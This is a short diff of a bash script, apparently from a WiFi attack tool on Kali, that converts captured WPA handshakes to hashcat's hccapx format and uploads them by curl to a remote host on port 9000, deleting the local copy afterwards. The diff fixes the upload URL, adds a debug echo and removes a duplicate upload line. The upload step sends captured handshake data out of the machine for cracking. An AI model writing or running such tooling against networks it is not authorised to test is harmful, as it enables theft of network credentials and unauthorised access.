@@ -19,7 +19,7 @@ sendHandshake() {
  # echo $1
  # echo $2
 
-  curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@$1" http://:9000/upload
+  curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/upload
   if [[ $! == 0 ]]; then
     rm $1
   else
@@ -28,6 +28,7 @@ sendHandshake() {
 }
 
 checkHandshakes() {
+  echo $1
   echo "Check handshakes..."
   output=$(cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx)
   echo $output
@@ -109,7 +110,6 @@ if [[ $1 == "p" ]]
 then
   echo "Selected passive mode"
   echo $2
-  curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@/home/kali/shakes/shake1" http://$2:9000/upload
   passive $2
 fi
 if [[ $1 == "a"]]
